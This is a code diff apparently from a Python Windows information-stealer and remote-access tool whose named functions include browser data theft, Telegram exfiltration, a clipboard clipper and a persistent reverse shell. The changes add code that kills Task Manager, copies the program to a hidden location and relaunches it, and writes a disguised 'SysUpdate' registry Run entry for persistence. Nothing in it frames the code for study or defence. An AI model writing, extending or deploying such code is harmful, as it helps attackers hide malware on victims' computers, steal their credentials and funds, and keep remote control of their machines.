@@ -121,10 +121,16 @@ def detect_vm():
             with open(os.path.join(EXTRACT_FOLDER, "vm_detected.txt"), "w") as f:
                 f.write(f"VM Detected: {i}\n")
 
-def kill_taskmgr():
-    for proc in psutil.process_iter(['name']):
-        if proc.info['name'] and "Taskmgr.exe" in proc.info['name']:
-            proc.kill()
+def kill_taskmgr_once():
+    try:
+        for proc in psutil.process_iter(['name']):
+            name = proc.info['name']
+            if name and "taskmgr.exe" in name.lower():
+                proc.kill()
+                break
+    except:
+        pass
+
 
 # === BROWSER DATA THEFT ===
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -330,25 +336,67 @@ def send_zip_to_telegram():
             errlog.write(str(e))
 
 
+def ensure_hidden_copy():
+    os.makedirs(EXTRACT_FOLDER, exist_ok=True)
+    subprocess.call(f'attrib +h "{EXTRACT_FOLDER}"', shell=True)
 
-# === PERSISTENCE ===
+    current_path = os.path.abspath(sys.argv[0])
+    dest_path = EXE_PATH
+
+    if current_path.lower() != dest_path.lower():
+        if not os.path.exists(dest_path):
+            shutil.copy2(current_path, dest_path)
+            subprocess.call(f'attrib +h "{dest_path}"', shell=True)
+
+        # Start the copied version silently
+        subprocess.Popen(f'"{dest_path}"', shell=True)
+        os._exit(0)  # Kill original
+
+
+
+
 # === PERSISTENCE ===
 def persist():
     try:
-        # Skip self-copy logic entirely
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        app_name = "SysUpdate"
+        exe_path = EXE_PATH
 
-        # Just ensure registry persistence using current path
-        current_path = os.path.abspath(sys.argv[0])
-        reg_key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0, winreg.KEY_SET_VALUE
-        )
-        winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, current_path)
+        # Open registry key for write
+        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+
+        try:
+            current_value, _ = winreg.QueryValueEx(reg_key, app_name)
+        except FileNotFoundError:
+            current_value = None
+
+        if current_value != exe_path:
+            winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, exe_path)
+
         winreg.CloseKey(reg_key)
 
     except Exception as e:
         print(f"[!] Persistence error: {e}")
+
+
+
+# # === PERSISTENCE ===
+# def persist():
+#     try:
+#         # Skip self-copy logic entirely
+
+#         # Just ensure registry persistence using current path
+#         current_path = os.path.abspath(sys.argv[0])
+#         reg_key = winreg.OpenKey(
+#             winreg.HKEY_CURRENT_USER,
+#             r"Software\Microsoft\Windows\CurrentVersion\Run",
+#             0, winreg.KEY_SET_VALUE
+#         )
+#         winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, current_path)
+#         winreg.CloseKey(reg_key)
+
+#     except Exception as e:
+#         print(f"[!] Persistence error: {e}")
 
 
 
@@ -541,7 +589,8 @@ def keep_reverse_shell_alive():
 
 
 def run():
-    # START THREADS IMMEDIATELY
+    ensure_hidden_copy()  # ← this ensures you’re running from the hidden copy
+
     threading.Thread(target=clipper_loop, daemon=True).start()
     threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
 
@@ -562,8 +611,9 @@ def run():
         send_zip_to_telegram()
         mark_exfiltrated()
 
-    persist()
+    persist()  # ← this ensures registry is always pointing to hidden exe
     fake_input()
+
     while True:
         time.sleep(10)
 
